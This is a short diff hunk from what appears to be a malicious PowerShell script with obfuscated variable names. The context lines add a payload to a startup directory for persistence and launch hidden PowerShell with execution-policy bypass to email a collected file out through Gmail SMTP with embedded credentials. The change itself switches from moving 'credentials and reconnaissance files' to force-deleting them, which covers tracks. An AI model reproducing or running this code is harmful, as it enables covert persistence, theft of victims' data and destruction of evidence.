@@ -52,10 +52,8 @@ Add-Content -Path $rtsRfiZBxpGP -Value $fXmtFxsAMdGw        #startup dir
 powershell powershell.exe -noP -ep bypass -w hidden "{Send-MailMessage -from $QLxOhYDbSkv -to $QLxOhYDbSkv -subject $rtsRfiZBxpGP -attachments $rtsRfiZBxpGP -smtpserver 'smtp.gmail.com' -port '587' -usessl -credential (new-object -typename system.management.automation.pscredential -argumentlist $QLxOhYDbSkv ,(convertto-securestring -string '$MQKWAnzsGSxJ' -asplaintext -force))}"
 
 # cleanup your credentials and reconnaissance files
-# Remove-Item .\KHPWMpTitfZ.txt -Force
-# Remove-Item .\oSyEZsgTWIU.txt -Force
-Move-Item -path .\KHPWMpTitfZ.txt -Destination $env:temp
-Move-Item -path .\oSyEZsgTWIU.txt -Destination $env:temp
+Remove-Item .\KHPWMpTitfZ.txt -Force
+Remove-Item .\oSyEZsgTWIU.txt -Force
 Remove-Item .\$rtsRfiZBxpGP -Force
 
 
